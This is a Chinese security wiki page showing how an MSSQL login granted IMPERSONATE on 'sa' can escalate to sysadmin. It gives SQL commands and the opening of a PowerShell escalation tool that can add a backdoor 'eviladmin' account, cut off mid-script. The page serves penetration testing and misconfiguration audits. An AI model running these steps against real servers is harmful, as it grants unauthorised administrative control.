<!DOCTYPE html>
<html lang="en">
<head>
  
  
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    
    <meta name="author" content="内部使用">
    <link rel="canonical" href="https://secnn.com/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/Mssql/Mssql%20%E6%A8%A1%E6%8B%9F%E7%99%BB%E5%BD%95%E6%8F%90%E6%9D%83/">
    <link rel="shortcut icon" href="../../../favicon.ico">
    
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
    <title>Mssql 模拟登录提权 - SecNN-Wiki漏洞库管理系统&网络安全知识库-本Wiki所有信息来源于公开漏洞数据库</title>
    <link href="../../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
    <link href="../../../css/font-awesome-4.7.0.css" rel="stylesheet">
    <link href="../../../css/base.css" rel="stylesheet">
    <link rel="stylesheet" href="../../../css/highlight.css">
    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
    <!--[if lt IE 9]>
        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
    <![endif]-->

    <script src="../../../js/jquery-3.2.1.min.js"></script>
    <script src="../../../js/bootstrap-3.3.7.min.js"></script>
    <script src="../../../js/highlight.pack.js"></script>
    
    <base target="_top">
    <script>
      var base_url = '../../..';
      var is_top_frame = false;
        
        var pageToc = [
          {title: "Mssql \u6a21\u62df\u767b\u5f55\u63d0\u6743", url: "#_top", children: [
              {title: "0x01 \u524d\u63d0", url: "#0x01" },
              {title: "0x02 \u590d\u73b0", url: "#0x02" },
              {title: "0x03 \u5de5\u5177\u5316", url: "#0x03" },
          ]},
        ];

    </script>
    <script src="../../../js/base.js"></script>
      <script src="../../../search/main.js"></script> 
</head>

<body>
<script>
if (is_top_frame) { $('body').addClass('wm-top-page'); }
</script>



<div class="container-fluid wm-page-content">
  <a name="_top"></a>
    

    
    
      
    

  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
    
    <div class="wm-article-nav pull-right">
      <a href="../../Mtab%E4%B9%A6%E7%AD%BE%E5%AF%BC%E8%88%AA%E7%A8%8B%E5%BA%8F/Mtab%E4%B9%A6%E7%AD%BE%E5%AF%BC%E8%88%AA%E7%A8%8B%E5%BA%8F%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-right">
        Next
        <i class="fa fa-chevron-right" aria-hidden="true"></i>
      </a>
      <a href="../../Mtab%E4%B9%A6%E7%AD%BE%E5%AF%BC%E8%88%AA%E7%A8%8B%E5%BA%8F/Mtab%E4%B9%A6%E7%AD%BE%E5%AF%BC%E8%88%AA%E7%A8%8B%E5%BA%8F%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
        Mtab书签导航程序存在SQL注入漏洞
      </a>
    </div>
    
    <div class="wm-article-nav">
      <a href="../Mssql%20%E5%8F%97%E4%BF%A1%E7%94%A8%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83/" class="btn btn-xs btn-default pull-left">
        <i class="fa fa-chevron-left" aria-hidden="true"></i>
        Previous</a><a href="../Mssql%20%E5%8F%97%E4%BF%A1%E7%94%A8%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83/" class="btn btn-xs btn-link">
        Mssql 受信用数据库提权
      </a>
    </div>
    
  </div>

    

    <h1 id="mssql">Mssql 模拟登录提权<a class="headerlink" href="#mssql" title="Permanent link">&para;</a></h1>
<h2 id="0x01">0x01 前提<a class="headerlink" href="#0x01" title="Permanent link">&para;</a></h2>
<p>开发者有时为了满足某种需求，允许其他登录用户模拟高权限的用户，对于开发来说，一个再简单不过的功能。虽然严格意义上这不算个漏洞，但是这种配置不当一般可以用来提权。</p>
<h2 id="0x02">0x02 复现<a class="headerlink" href="#0x02" title="Permanent link">&para;</a></h2>
<h4 id="1sa4">1.sa用户登录创建4个用户<a class="headerlink" href="#1sa4" title="Permanent link">&para;</a></h4>
<div class="codehilite"><pre><span></span><code>-- Create login 1
CREATE LOGIN MyUser1 WITH PASSWORD = &#39;MyPassword!&#39;;
-- Create login 2
CREATE LOGIN MyUser2 WITH PASSWORD = &#39;MyPassword!&#39;;
-- Create login 3
CREATE LOGIN MyUser3 WITH PASSWORD = &#39;MyPassword!&#39;;
-- Create login 4
CREATE LOGIN MyUser4 WITH PASSWORD = &#39;MyPassword!&#39;;
</code></pre></div>

<p><img alt="1.png" src="../resource/Mssql%E6%A8%A1%E6%8B%9F%E7%99%BB%E5%BD%95%E6%8F%90%E6%9D%83/media/rId24.png" /></p>
<h4 id="2myuser1-myuser2-myuser3sa">2.赋予用户MyUser1权限来模拟 MyUser2, MyUser3,及sa<a class="headerlink" href="#2myuser1-myuser2-myuser3sa" title="Permanent link">&para;</a></h4>
<div class="codehilite"><pre><span></span><code><span class="k">USE</span><span class="w"> </span><span class="n">master</span><span class="p">;</span>
<span class="k">GRANT</span><span class="w"> </span><span class="n">IMPERSONATE</span><span class="w"> </span><span class="k">ON</span><span class="w"> </span><span class="nl">LOGIN</span><span class="p">:</span><span class="err">:</span><span class="n">sa</span><span class="w"> </span><span class="k">to</span><span class="w"> </span><span class="o">[</span><span class="n">MyUser1</span><span class="o">]</span><span class="p">;</span>
<span class="k">GRANT</span><span class="w"> </span><span class="n">IMPERSONATE</span><span class="w"> </span><span class="k">ON</span><span class="w"> </span><span class="nl">LOGIN</span><span class="p">:</span><span class="err">:</span><span class="n">MyUser2</span><span class="w"> </span><span class="k">to</span><span class="w"> </span><span class="o">[</span><span class="n">MyUser1</span><span class="o">]</span><span class="p">;</span>
<span class="k">GRANT</span><span class="w"> </span><span class="n">IMPERSONATE</span><span class="w"> </span><span class="k">ON</span><span class="w"> </span><span class="nl">LOGIN</span><span class="p">:</span><span class="err">:</span><span class="n">MyUser3</span><span class="w"> </span><span class="k">to</span><span class="w"> </span><span class="o">[</span><span class="n">MyUser1</span><span class="o">]</span><span class="p">;</span>
<span class="k">GO</span>
</code></pre></div>

<p><img alt="2.png" src="../resource/Mssql%E6%A8%A1%E6%8B%9F%E7%99%BB%E5%BD%95%E6%8F%90%E6%9D%83/media/rId26.png" /></p>
<p>这里的GRANT IMPERSONATE ON
LOGIN意思是授权MyUser1用户对sa,MyUser2,MyUser3用户登录权限，查看sqlserver的文档<code>https://docs.microsoft.com/zh-cn/sql/t-sql/statements/grant-server-principal-permissions-transact-sql?view=sql-server-ver15</code></p>
<p><img alt="3.png" src="../resource/Mssql%E6%A8%A1%E6%8B%9F%E7%99%BB%E5%BD%95%E6%8F%90%E6%9D%83/media/rId27.png" /></p>
<p>在SQL Server的安全模型中，模拟（IMPERSONATE
）权限的安全对象是User或Login，被授予者（Grantee
）有权限模拟指定用户，在其安全上下文执行特定的操作。例如，user1授予模拟user2的权限，当user2的安全上下文有足够的权限，而user1没有时，通过权限模拟，user1能够在user2的权限上下文中执行查询请求：</p>
<div class="codehilite"><pre><span></span><code><span class="nt">GRANT</span><span class="w"> </span><span class="nt">IMPERSONATE</span><span class="w"> </span><span class="nt">ON</span><span class="w"> </span><span class="nt">USER</span><span class="o">::</span><span class="w"> </span><span class="nt">user2</span><span class="w"> </span><span class="nt">TO</span><span class="w"> </span><span class="nt">user1</span><span class="o">;</span>
</code></pre></div>

<p>通过执行EXECUTE AS
命令模拟用户的权限，用户user1就运行在user2的安全上下文中，例如，user1在登陆数据库之后，模拟user2的权限：</p>
<div class="codehilite"><pre><span></span><code>EXECUTE AS USER = &#39;user2&#39;;
</code></pre></div>

<h4 id="3">3.查找可以模拟登录的用户<a class="headerlink" href="#3" title="Permanent link">&para;</a></h4>
<p>默认情况下，系统管理员可以模拟任何人，但是正常登录必须分配权限来模拟特定的用户，使用MyUser1用户登录，打开新建查询，执行下面语句查询那些用户可以用来模拟登录</p>
<div class="codehilite"><pre><span></span><code>SELECT distinct b.name
FROM sys.server_permissions a
INNER JOIN sys.server_principals b
ON a.grantor_principal_id = b.principal_id
WHERE a.permission_name = &#39;IMPERSONATE&#39;
</code></pre></div>

<p><img alt="4.png" src="../resource/Mssql%E6%A8%A1%E6%8B%9F%E7%99%BB%E5%BD%95%E6%8F%90%E6%9D%83/media/rId29.png" /></p>
<p>这里我们可以看到MyUser1用户可以模拟登录sa,MyUser2,MyUser2用户，接下来就是模拟登录sa来获取sysadmin权限了</p>
<h4 id="4sql-server">4.模拟SQL Server用户登陆<a class="headerlink" href="#4sql-server" title="Permanent link">&para;</a></h4>
<div class="codehilite"><pre><span></span><code>-- 验证是否为sysadmin权限
SELECT SYSTEM_USER
SELECT IS_SRVROLEMEMBER(&#39;sysadmin&#39;)
-- 模拟sa登录
EXECUTE AS LOGIN = &#39;sa&#39;
-- 验证是否为sysadmin权限
SELECT SYSTEM_USER
SELECT IS_SRVROLEMEMBER(&#39;sysadmin&#39;)
</code></pre></div>

<p><img alt="5.png" src="../resource/Mssql%E6%A8%A1%E6%8B%9F%E7%99%BB%E5%BD%95%E6%8F%90%E6%9D%83/media/rId31.png" /></p>
<p>可以看到，第二个查询之后我们已经是sysadmin的权限了</p>
<p>我们再用查看登录用户来验证下</p>
<div class="codehilite"><pre><span></span><code>SELECT * FROM master.sys.sysusers
WHERE islogin = 1
</code></pre></div>

<p>模拟sa登录之前</p>
<p><img alt="6.png" src="../resource/Mssql%E6%A8%A1%E6%8B%9F%E7%99%BB%E5%BD%95%E6%8F%90%E6%9D%83/media/rId32.png" /></p>
<p>模拟sa登录之后</p>
<p><img alt="7.png" src="../resource/Mssql%E6%A8%A1%E6%8B%9F%E7%99%BB%E5%BD%95%E6%8F%90%E6%9D%83/media/rId33.png" /></p>
<p>权限高了，可以看到更多的用户登录</p>
<h4 id="5">5.回到原来的登录<a class="headerlink" href="#5" title="Permanent link">&para;</a></h4>
<div class="codehilite"><pre><span></span><code>REVERT
SELECT SYSTEM_USER
SELECT IS_SRVROLEMEMBER(&#39;sysadmin&#39;)
</code></pre></div>

<p><img alt="8.png" src="../resource/Mssql%E6%A8%A1%E6%8B%9F%E7%99%BB%E5%BD%95%E6%8F%90%E6%9D%83/media/rId35.png" /></p>
<p>这样我们又回到myuser1用户登录的会话了</p>
<h2 id="0x03">0x03 工具化<a class="headerlink" href="#0x03" title="Permanent link">&para;</a></h2>
<blockquote>
<p>当然这个也可以用powershell一键实现</p>
</blockquote>
<h3 id="poc">poc<a class="headerlink" href="#poc" title="Permanent link">&para;</a></h3>
<blockquote>
<p>Invoke-SqlServer-Escalate-ExecuteAs.psm1</p>
</blockquote>
<div class="codehilite"><pre><span></span><code><span class="k">function</span><span class="w"> </span><span class="nf">Invoke</span><span class="o">-</span><span class="n">SqlServer</span><span class="o">-</span><span class="n">Escalate</span><span class="o">-</span><span class="n">ExecuteAs</span>
<span class="p">{</span>
<span class="w">    </span><span class="o">&lt;</span>#
<span class="w">    </span><span class="p">.</span><span class="n">SYNOPSIS</span>
<span class="w">    </span><span class="n">This</span><span class="w"> </span><span class="n">script</span><span class="w"> </span><span class="n">can</span><span class="w"> </span><span class="n">be</span><span class="w"> </span><span class="n">used</span><span class="w"> </span><span class="n">escalate</span><span class="w"> </span><span class="n">privileges</span><span class="w"> </span><span class="k">if</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">IMPERSONATION</span><span class="w"> </span><span class="n">privilege</span><span class="w"> </span><span class="n">has</span><span class="w"> </span><span class="n">been</span><span class="w"> </span><span class="n">assigned</span><span class="w"> </span><span class="n">to</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">user</span><span class="p">.</span>

<span class="w">    </span><span class="p">.</span><span class="n">DESCRIPTION</span>
<span class="w">    </span><span class="n">This</span><span class="w"> </span><span class="n">script</span><span class="w"> </span><span class="n">can</span><span class="w"> </span><span class="n">be</span><span class="w"> </span><span class="n">used</span><span class="w"> </span><span class="n">escalate</span><span class="w"> </span><span class="n">privileges</span><span class="w"> </span><span class="k">if</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">IMPERSONATION</span><span class="w"> </span><span class="n">privilege</span><span class="w"> </span><span class="n">has</span><span class="w"> </span><span class="n">been</span><span class="w"> </span><span class="n">assigned</span><span class="w"> </span><span class="n">to</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">user</span><span class="p">.</span>
<span class="w">    </span><span class="n">In</span><span class="w"> </span><span class="n">most</span><span class="w"> </span><span class="n">cases</span><span class="w"> </span><span class="n">this</span><span class="w"> </span><span class="n">results</span><span class="w"> </span><span class="n">in</span><span class="w"> </span><span class="n">additional</span><span class="w"> </span><span class="n">data</span><span class="w"> </span><span class="n">access</span><span class="p">,</span><span class="w"> </span><span class="n">but</span><span class="w"> </span><span class="n">in</span><span class="w"> </span><span class="n">some</span><span class="w"> </span><span class="n">cases</span><span class="w"> </span><span class="n">it</span><span class="w"> </span><span class="n">can</span><span class="w"> </span><span class="n">be</span><span class="w"> </span><span class="n">used</span><span class="w"> </span><span class="n">to</span><span class="w"> </span><span class="n">gain</span><span class="w"> </span><span class="n">sysadmin</span>
<span class="w">    </span><span class="n">privileges</span><span class="p">.</span><span class="w">  </span><span class="n">This</span><span class="w"> </span><span class="n">script</span><span class="w"> </span><span class="n">can</span><span class="w"> </span><span class="n">also</span><span class="w"> </span><span class="n">be</span><span class="w"> </span><span class="n">used</span><span class="w"> </span><span class="n">to</span><span class="w"> </span><span class="nb">add</span><span class="w"> </span><span class="n">a</span><span class="w"> </span><span class="n">new</span><span class="w"> </span><span class="n">sysadmin</span><span class="w"> </span><span class="n">instead</span><span class="w"> </span><span class="n">of</span><span class="w"> </span><span class="n">escalating</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">privileges</span><span class="w"> </span><span class="n">of</span>
<span class="w">    </span><span class="n">the</span><span class="w"> </span><span class="n">existing</span><span class="w"> </span><span class="n">user</span><span class="p">.</span>

<span class="w">    </span><span class="p">.</span><span class="n">EXAMPLE</span>
<span class="w">    </span><span class="n">Adding</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">current</span><span class="w"> </span><span class="n">user</span><span class="w"> </span><span class="n">to</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">syadmin</span><span class="w"> </span><span class="n">role</span><span class="w"> </span><span class="k">if</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">user</span><span class="w"> </span><span class="n">has</span><span class="w"> </span><span class="n">permissions</span><span class="w"> </span><span class="n">to</span><span class="w"> </span><span class="n">impersonate</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">sa</span><span class="w"> </span><span class="n">account</span><span class="p">.</span>

<span class="w">    </span><span class="n">PS</span><span class="w"> </span><span class="n">C</span><span class="p">:</span><span class="o">\&gt;</span><span class="w"> </span><span class="n">Invoke</span><span class="o">-</span><span class="n">SqlServer</span><span class="o">-</span><span class="n">Escalate</span><span class="o">-</span><span class="n">ExecuteAs</span><span class="w"> </span><span class="o">-</span><span class="n">SqlUser</span><span class="w"> </span><span class="n">myappuser</span><span class="w"> </span><span class="o">-</span><span class="n">SqlPass</span><span class="w"> </span><span class="n">MyPassword</span>!<span class="w"> </span><span class="o">-</span><span class="n">SqlServerInstance</span><span class="w"> </span><span class="n">SQLServer1</span><span class="o">\</span><span class="n">SQLEXPRESS</span>
<span class="w">    </span><span class="p">[</span><span class="o">*</span><span class="p">]</span><span class="w"> </span><span class="n">Attempting</span><span class="w"> </span><span class="n">to</span><span class="w"> </span><span class="n">Connect</span><span class="w"> </span><span class="n">to</span><span class="w"> </span><span class="n">SQLServer</span><span class="o">\</span><span class="n">SQLEXPRESS</span><span class="w"> </span><span class="n">as</span><span class="w"> </span><span class="n">myappuser</span><span class="k">...</span>
<span class="w">    </span><span class="p">[</span><span class="o">*</span><span class="p">]</span><span class="w"> </span><span class="n">Connected</span><span class="p">.</span>
<span class="w">    </span><span class="p">[</span><span class="o">*</span><span class="p">]</span><span class="w"> </span><span class="n">Enumerating</span><span class="w"> </span><span class="n">users</span><span class="w"> </span><span class="n">that</span><span class="w"> </span><span class="n">myappuser</span><span class="w"> </span><span class="n">can</span><span class="w"> </span><span class="n">impersonate</span><span class="k">...</span>
<span class="w">    </span><span class="p">[</span><span class="o">*</span><span class="p">]</span><span class="w"> </span><span class="mi">3</span><span class="w"> </span><span class="n">accounts</span><span class="w"> </span><span class="n">can</span><span class="w"> </span><span class="n">be</span><span class="w"> </span><span class="n">impersonated</span><span class="p">:</span>
<span class="w">    </span><span class="p">[</span><span class="o">*</span><span class="p">]</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="n">user2</span>
<span class="w">    </span><span class="p">[</span><span class="o">*</span><span class="p">]</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="n">superuser</span>
<span class="w">    </span><span class="p">[</span><span class="o">*</span><span class="p">]</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="n">sa</span>
<span class="w">    </span><span class="p">[</span><span class="o">*</span><span class="p">]</span><span class="w"> </span><span class="n">Checking</span><span class="w"> </span><span class="k">if</span><span class="w"> </span><span class="nb">any</span><span class="w"> </span><span class="n">of</span><span class="w"> </span><span class="n">are</span><span class="w"> </span><span class="n">sysadmins</span><span class="k">...</span>
<span class="w">    </span><span class="p">[</span><span class="o">*</span><span class="p">]</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="n">user2</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="n">NOT</span><span class="w"> </span><span class="n">sysadmin</span>
<span class="w">    </span><span class="p">[</span><span class="o">*</span><span class="p">]</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="n">superuser</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="n">NOT</span><span class="w"> </span><span class="n">sysadmin</span>
<span class="w">    </span><span class="p">[</span><span class="o">*</span><span class="p">]</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="n">sa</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="n">sysadmin</span>!
<span class="w">    </span><span class="p">[</span><span class="o">*</span><span class="p">]</span><span class="w"> </span><span class="n">Attempting</span><span class="w"> </span><span class="n">to</span><span class="w"> </span><span class="nb">add</span><span class="w"> </span><span class="n">myappuser</span><span class="w"> </span><span class="n">to</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">sysadmin</span><span class="w"> </span><span class="n">role</span><span class="w"> </span><span class="n">via</span><span class="w"> </span><span class="n">impersonation</span><span class="k">...</span>
<span class="w">    </span><span class="p">[</span><span class="o">*</span><span class="p">]</span><span class="w"> </span><span class="n">Verifying</span><span class="w"> </span><span class="n">that</span><span class="w"> </span><span class="n">myappuser</span><span class="w"> </span><span class="n">was</span><span class="w"> </span><span class="n">added</span><span class="w"> </span><span class="n">to</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">sysadmin</span><span class="w"> </span><span class="n">role</span><span class="k">...</span>
<span class="w">    </span><span class="p">[</span><span class="o">*</span><span class="p">]</span><span class="w"> </span><span class="n">Success</span>!<span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="n">myappuser</span><span class="w"> </span><span class="n">is</span><span class="w"> </span><span class="nb">now</span><span class="w"> </span><span class="n">a</span><span class="w"> </span><span class="n">sysadmin</span><span class="p">.</span>
<span class="w">    </span><span class="p">[</span><span class="o">*</span><span class="p">]</span><span class="w"> </span><span class="n">All</span><span class="w"> </span><span class="n">done</span><span class="p">.</span>

<span class="w">    </span><span class="p">.</span><span class="n">EXAMPLE</span>
<span class="w">    </span><span class="n">Creating</span><span class="w"> </span><span class="n">a</span><span class="w"> </span><span class="n">new</span><span class="w"> </span><span class="n">sysadmin</span><span class="w"> </span><span class="n">as</span><span class="w"> </span><span class="n">a</span><span class="w"> </span><span class="n">user</span><span class="w"> </span><span class="n">with</span><span class="w"> </span><span class="n">permissions</span><span class="w"> </span><span class="n">to</span><span class="w"> </span><span class="n">impersonate</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">sa</span><span class="w"> </span><span class="n">account</span><span class="p">.</span>

<span class="w">    </span><span class="n">PS</span><span class="w"> </span><span class="n">C</span><span class="p">:</span><span class="o">\&gt;</span><span class="w"> </span><span class="n">Invoke</span><span class="o">-</span><span class="n">SqlServer</span><span class="o">-</span><span class="n">Escalate</span><span class="o">-</span><span class="n">ExecuteAs</span><span class="w"> </span><span class="o">-</span><span class="n">SqlUser</span><span class="w"> </span><span class="n">myappuser</span><span class="w"> </span><span class="o">-</span><span class="n">SqlPass</span><span class="w"> </span><span class="n">MyPassword</span>!<span class="w"> </span><span class="o">-</span><span class="n">SqlServerInstance</span><span class="w"> </span><span class="n">SQLServer1</span><span class="o">\</span><span class="n">SQLEXPRESS</span><span class="w"> </span><span class="o">-</span><span class="n">NewUser</span><span class="w"> </span><span class="n">eviladmin</span><span class="w"> </span><span class="o">-</span><span class="n">NewPass</span><span class="w"> </span><span class="n">MyPassword</span>!
<span class="w">    </span><span class="p">[</span><span class="o">*</span><span class="p">]</span><span class="w"> </span><span class="n">Attempting</span><span class="w"> </span><span class="n">to</span><span class="w"> </span><span class="n">Connect</span><span class="w"> </span><span class="n">to</span><span class="w"> </span><span class="n">SQLServer</span><span class="o">\</span><span class="n">SQLEXPRESS</span><span class="w"> </span><span class="n">as</span><span class="w"> </span><span class="n">myappuser</span><span class="k">...</span>
<span class="w">    </span><span class="p">[</span><span class="o">*</span><span class="p">]</span><span class="w"> </span><span class="n">Connected</span><span class="p">.</span>
<span class="w">    </span><span class="p">[</span><span class="o">*</span><span class="p">]</span><span class="w"> </span><span class="n">Enumerating</span><span class="w"> </span><span class="n">users</span><span class="w"> </span><span class="n">that</span><span class="w"> </span><span class="n">myappuser</span><span class="w"> </span><span class="n">can</span><span class="w"> </span><span class="n">impersonate</span><span class="k">...</span>
<span class="w">    </span><span class="p">[</span><span class="o">*</span><span class="p">]</span><span class="w"> </span><span class="mi">3</span><span class="w"> </span><span class="n">accounts</span><span class="w"> </span><span class="n">can</span><span class="w"> </span><span class="n">be</span><span class="w"> </span><span class="n">impersonated</span><span class="p">:</span>
<span class="w">    </span><span class="p">[</span><span class="o">*</span><span class="p">]</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="n">user2</span>
<span class="w">    </span><span class="p">[</span><span class="o">*</span><span class="p">]</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="n">superuser</span>
<span class="w">    </span><span class="p">[</span><span class="o">*</span><span class="p">]</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="n">sa</span>
<span class="w">    </span><span class="p">[</span><span class="o">*</span><span class="p">]</span><span class="w"> </span><span class="n">Checking</span><span class="w"> </span><span class="k">if</span><span class="w"> </span><span class="nb">any</span><span class="w"> </span><span class="n">of</span><span class="w"> </span><span class="n">are</span><span class="w"> </span><span class="n">sysadmins</span><span class="k">...</span>
<span class="w">    </span><span class="p">[</span><span class="o">*</span><span class="p">]</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="n">user2</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="n">NOT</span><span class="w"> </span><span class="n">sysadmin</span>
<span class="w">    </span><span class="p">[</span><span class="o">*</span><span class="p">]</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="n">superuser</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="n">NOT</span><span class="w"> </span><span class="n">sysadmin</span>
<span class="w">    </span><span class="p">[</span><span class="o">*</span><span class="p">]</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="n">sa</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="n">sysadmin</span>!
<span class="w">    </span><span class="p">[</span><span class="o">*</span><span class="p">]</span><span class="w"> </span><span class="n">Attempting</span><span class="w"> </span><span class="n">to</span><span class="w"> </span><span class="n">create</span><span class="w"> </span><span class="n">and</span><span class="w"> </span><span class="nb">add</span><span class="w"> </span><span class="n">eviladmin</span><span class="w"> </span><span class="n">to</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">sysadmin</span><span class="w"> </span><span class="n">role</span><span class="w"> </span><span class="n">via</span><span class="w"> </span><span class="n">impersonation</span><span class="k">...</span>
<span class="w">    </span><span class="p">[</span><span class="o">*</span><span class="p">]</span><span class="w"> </span><span class="n">Verifying</span><span class="w"> </span><span class="n">that</span><span class="w"> </span><span class="n">eviladmin</span><span class="w"> </span><span class="n">was</span><span class="w"> </span><span class="n">added</span><span class="w"> </span><span class="n">to</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">sysadmin</span><span class="w"> </span><span class="n">role</span><span class="k">...</span>
<span class="w">    </span><span class="p">[</span><span class="o">*</span><span class="p">]</span><span class="w"> </span><span class="n">Success</span>!<span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="n">eviladmin</span><span class="w"> </span><span class="n">is</span><span class="w"> </span><span class="nb">now</span><span class="w"> </span><span class="n">a</span><span class="w"> </span><span class="n">sysadmin</span><span class="p">.</span>
<span class="w">    </span><span class="p">[</span><span class="o">*</span><span class="p">]</span><span class="w"> </span><span class="n">All</span><span class="w"> </span><span class="n">done</span><span class="p">.</span>

<span class="w">    </span><span class="p">.</span><span class="n">LINK</span>
<span class="w">       </span><span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">www</span><span class="p">.</span><span class="n">netspi</span><span class="p">.</span><span class="n">com</span>
<span class="w">       </span><span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">msdn</span><span class="p">.</span><span class="n">microsoft</span><span class="p">.</span><span class="n">com</span><span class="o">/</span><span class="n">en</span><span class="o">-</span><span class="n">us</span><span class="o">/</span><span class="n">library</span><span class="o">/</span><span class="n">ms178640</span><span class="p">.</span><span class="n">aspx</span>

<span class="w">    </span><span class="p">.</span><span class="n">NOTES</span>
<span class="w">       </span><span class="n">Author</span><span class="p">:</span><span class="w"> </span><span class="n">Scott</span><span class="w"> </span><span class="n">Sutherland</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="mi">2014</span><span class="p">,</span><span class="w"> </span><span class="n">NetSPI</span>
<span class="w">       </span><span class="n">Version</span><span class="p">:</span><span class="w"> </span><span class="n">Invoke</span><span class="o">-</span><span class="n">SqlServer</span><span class="o">-</span><span class="n">Escalate</span><span class="o">-</span><span class="n">ExecuteAs</span><span class="p">.</span><span class="n">psm1</span><span class="w"> </span><span class="n">v1</span><span class="p">.</span><span class="mi">0</span>
<span class="w">       </span><span class="n">Comments</span><span class="p">:</span><span class="w"> </span><span class="n">This</span><span class="w"> </span><span class="n">should</span><span class="w"> </span><span class="n">work</span><span class="w"> </span><span class="n">on</span><span class="w"> </span><span class="n">SQL</span><span class="w"> </span><span class="n">Server</span><span class="w"> </span><span class="mi">2005</span><span class="w"> </span><span class="n">and</span><span class="w"> </span><span class="n">Above</span><span class="p">.</span>

<span class="w">    </span><span class="p">.</span><span class="n">TODO</span>
<span class="w">    </span><span class="nb">fix</span><span class="w"> </span><span class="nb">double</span><span class="w"> </span><span class="nb">run</span><span class="w"> </span><span class="n">bug</span>
<span class="w">    </span><span class="nb">fix</span><span class="w"> </span><span class="n">alternative</span><span class="w"> </span><span class="n">creds</span><span class="w"> </span><span class="n">connection</span><span class="w"> </span><span class="n">use</span>
<span class="w">    </span>#<span class="o">&gt;</span>

<span class="w">  </span><span class="p">[</span><span class="n">CmdletBinding</span><span class="p">()]</span>
<span class="w">  </span><span class="n">Param</span><span class="p">(</span>

<span class="w">    </span><span class="p">[</span><span class="n">Parameter</span><span class="p">(</span><span class="n">Mandatory</span><span class="p">=</span>$<span class="nb">false</span><span class="p">,</span>
<span class="w">    </span><span class="n">HelpMessage</span><span class="p">=</span><span class="s">&#39;Set SQL Login username.&#39;</span><span class="p">)]</span>
<span class="w">    </span><span class="p">[</span><span class="nb">string</span><span class="p">]</span>$<span class="n">SqlUser</span><span class="p">,</span>

<span class="w">    </span><span class="p">[</span><span class="n">Parameter</span><span class="p">(</span><span class="n">Mandatory</span><span class="p">=</span>$<span class="nb">false</span><span class="p">,</span>
<span class="w">    </span><span class="n">HelpMessage</span><span class="p">=</span><span class="s">&#39;Set SQL Login password.&#39;</span><span class="p">)]</span>
<span class="w">    </span><span class="p">[</span><span class="nb">string</span><span class="p">]</span>$<span class="n">SqlPass</span><span class="p">,</span>

<span class="w">    </span><span class="p">[</span><span class="n">Parameter</span><span class="p">(</span><span class="n">Mandatory</span><span class="p">=</span>$<span class="nb">false</span><span class="p">,</span>
<span class="w">    </span><span class="n">HelpMessage</span><span class="p">=</span><span class="s">&#39;Set SQL Login username.&#39;</span><span class="p">)]</span>
<span class="w">    </span><span class="p">[</span><span class="nb">string</span><span class="p">]</span>$<span class="n">NewUser</span><span class="p">,</span>

<span class="w">    </span><span class="p">[</span><span class="n">Parameter</span><span class="p">(</span><span class="n">Mandatory</span><span class="p">=</span>$<span class="nb">false</span><span class="p">,</span>
<span class="w">    </span><span class="n">HelpMessage</span><span class="p">=</span><span class="s">&#39;Set SQL Login password.&#39;</span><span class="p">)]</span>
<span class="w">    </span><span class="p">[</span><span class="nb">string</span><span class="p">]</span>$<span class="n">NewPass</span><span class="p">,</span>

<span class="w">    </span><span class="p">[</span><span class="n">Parameter</span><span class="p">(</span><span class="n">Mandatory</span><span class="p">=</span>$<span class="nb">false</span><span class="p">,</span>
